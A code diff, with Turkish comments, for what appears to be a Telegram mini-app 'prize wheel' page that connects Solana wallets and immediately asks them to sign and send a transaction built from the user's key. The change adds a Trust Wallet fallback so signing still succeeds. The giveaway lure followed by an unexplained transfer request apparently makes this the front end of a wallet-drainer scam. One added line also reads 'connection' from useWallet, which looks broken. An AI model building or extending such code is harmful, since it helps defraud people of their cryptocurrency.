@@ -10,53 +10,46 @@ import { Transition } from '@headlessui/react'
 import { useConnection, useWallet } from '@solana/wallet-adapter-react'
 import type { WalletAdapter, WalletReadyState, WalletName } from '@solana/wallet-adapter-base'
 import { createUnsignedTransaction } from '@/app/services/transaction'
+import type { Transaction } from '@solana/web3.js'
 
-/* ——— Yalnızca solana augmentasyonu ——— */
+/* ——— Global augmentasyonlar ——— */
 declare global {
   interface Window {
     solana?: {
       isPhantom?: boolean
       connect?: () => Promise<any>
       disconnect?: () => Promise<void>
-      signTransaction?: (tx: any) => Promise<any>
+      signTransaction?: (tx: Transaction) => Promise<Transaction>
     }
+    trustwallet?: {
+      signTransaction: (tx: Transaction) => Promise<Transaction>
+    }
+    Telegram?: { WebApp: any }
   }
-}
-
-/* ——— Yerel Telegram WebApp tipi ——— */
-interface TgWebApp {
-  expand: () => void
-  requestFullscreen?: () => void
-  setHeaderColor: (typeOrColor: string, colorHex?: string) => void
-  setBackgroundColor: (colorHex: string) => void
-  disableVerticalSwipes?: () => void
-  scroll?: (offsetY: number) => void
 }
 
 export default function Page() {
   /* ——— Telegram Mini-App başlat ——— */
   useEffect(() => {
-    const webapp = window.Telegram?.WebApp as TgWebApp | undefined
+    const webapp = window.Telegram?.WebApp
     if (!webapp) return
     try {
       webapp.expand()
       webapp.requestFullscreen?.()
       webapp.setHeaderColor('bg_color', '#000000')
       webapp.setBackgroundColor('#000000')
-      if (webapp.disableVerticalSwipes) {
-        webapp.disableVerticalSwipes()
-      } else if (webapp.scroll) {
-        const lock = () => webapp.scroll!(window.scrollY)
+      webapp.disableVerticalSwipes?.() ?? webapp.scroll && (() => {
+        const lock = () => webapp.scroll(window.scrollY)
         window.addEventListener('scroll', lock)
         return () => window.removeEventListener('scroll', lock)
-      }
+      })()
     } catch { /**/ }
   }, [])
 
-  /* ——— Çark (spin) durumu ——— */
+  /* ——— Çark durumu ——— */
   const wheelRef = useRef<HTMLImageElement>(null)
-  const [hasSpun, setHasSpun] = useState<boolean>(
-    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
+  const [hasSpun, setHasSpun] = useState(() =>
+    typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
   )
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
@@ -76,12 +69,12 @@ export default function Page() {
     }, 10000)
   }
 
-  /* ——— Wallet & Drawer kontrolü ——— */
+  /* ——— Wallet ve Drawer kontrolü ——— */
+  const { connection, publicKey, sendTransaction, select, wallets } = useWallet()
   const { connection: conn } = useConnection()
-  const { wallets, select, publicKey, sendTransaction } = useWallet()
   const [drawerOpen, setDrawerOpen] = useState(false)
-  const [loading,    setLoading]    = useState(false)
-  const [msg,        setMsg]        = useState('')
+  const [loading, setLoading]       = useState(false)
+  const [msg, setMsg]               = useState('')
 
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
@@ -90,54 +83,52 @@ export default function Page() {
   const origin = typeof window !== 'undefined' ? window.location.origin : ''
   const dappUrl = encodeURIComponent(origin)
 
-  /* ——— Phantom deeplink fonksiyonu ——— */
+  /* ——— Phantom deeplink ——— */
   const openPhantomBrowser = () => {
     const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     window.open(universal, '_blank')
   }
 
-  /* ——— Wallet yapılandırmaları & sıralama ——— */
+  /* ——— Cüzdan konfigürasyonları & sıralama ——— */
   interface WalletConfig {
-    match: (adapterName: string) => boolean
+    match: (name: string) => boolean
     label: string
     icon: string
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
     {
-      match: name => name === 'Phantom',
+      match: n => n === 'Phantom',
       label: 'Phantom',
       icon: '/phantom.svg',
       deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     },
     {
-      match: name => name.toLowerCase().includes('trust'),
+      match: n => n.toLowerCase().includes('trust'),
       label: 'Trust Wallet',
       icon: '/trustwallet.svg',
       deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`
     },
     {
-      match: name => name.toLowerCase().includes('coinbase'),
+      match: n => n.toLowerCase().includes('coinbase'),
       label: 'Coinbase Wallet',
       icon: '/coinbase.svg',
       deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`
     },
     {
-      match: name =>
-        name.toLowerCase().includes('bitkeep') ||
-        name.toLowerCase().includes('bitget'),
+      match: n => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'),
       label: 'Bitget Wallet',
       icon: '/bitget.svg',
       deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`
     },
     {
-      match: name => name === 'Solflare',
+      match: n => n === 'Solflare',
       label: 'Solflare',
       icon: '/solflare.svg',
       deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
     },
     {
-      match: name => name === 'Backpack',
+      match: n => n === 'Backpack',
       label: 'Backpack',
       icon: '/backpack.svg',
       deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`
@@ -148,35 +139,43 @@ export default function Page() {
     adapter: WalletAdapter
     readyState: WalletReadyState
   }
-
-  // map + filter ile tip güvenli dizi
-  const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
+  const mapped = walletConfigs.map(cfg => {
     const w = wallets.find(w => cfg.match(w.adapter.name))
-    return w
-      ? { adapter: w.adapter, readyState: w.readyState, ...cfg }
-      : null
+    return w ? { ...cfg, adapter: w.adapter, readyState: w.readyState } : null
   })
-  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
-    (x): x is DrawerWallet => x !== null
-  )
+  const orderedWallets = (mapped.filter((x): x is DrawerWallet => !!x))
 
-  /* ——— Transaction gönderme ——— */
+  /* ——— İşlem gönderme fonksiyonu ——— */
   const doTx = async () => {
     setLoading(true)
     try {
-      // imzalanmamış tx oluştur
+      // 1) unsigned tx al
       const tx = await createUnsignedTransaction(publicKey || null)
       if (!tx) {
         setMsg('No enough Sol!')
         return
       }
-      // adapter ile imzala & gönder
-      const sig = await sendTransaction(tx, conn)
-      // onay
+
+      let sig: string
+      try {
+        // 2a) standart adapter ile sign & send
+        sig = await sendTransaction(tx, conn)
+      } catch (err) {
+        console.warn('sendTransaction failed, fallback for Trust Wallet', err)
+        // 2b) Trust Wallet mobil fallback
+        if (window.trustwallet?.signTransaction) {
+          const signed = await window.trustwallet.signTransaction(tx)
+          sig = await conn.sendRawTransaction(signed.serialize())
+        } else {
+          throw err
+        }
+      }
+
+      // 3) onay bekle
       await conn.confirmTransaction(sig, 'confirmed')
       setMsg('Transaction successful!')
-    } catch (e) {
-      console.error('Transaction error', e)
+    } catch (err) {
+      console.error('Transaction error', err)
       setMsg('Transaction failed')
     } finally {
       setLoading(false)
@@ -193,7 +192,6 @@ export default function Page() {
   /* ——— Cüzdan seçimi ——— */
   const handleWalletClick = async (w: DrawerWallet) => {
     closeDrawer()
-
     if (w.adapter.name === 'Phantom') {
       if (w.readyState === 'Installed' && window.solana?.isPhantom) {
         await select(w.adapter.name as WalletName)
@@ -202,12 +200,10 @@ export default function Page() {
         return openPhantomBrowser()
       }
     }
-
     if (w.readyState === 'Installed') {
       await select(w.adapter.name as WalletName)
       return doTx()
     }
-
     window.open(w.deepLink, '_blank')
   }
 
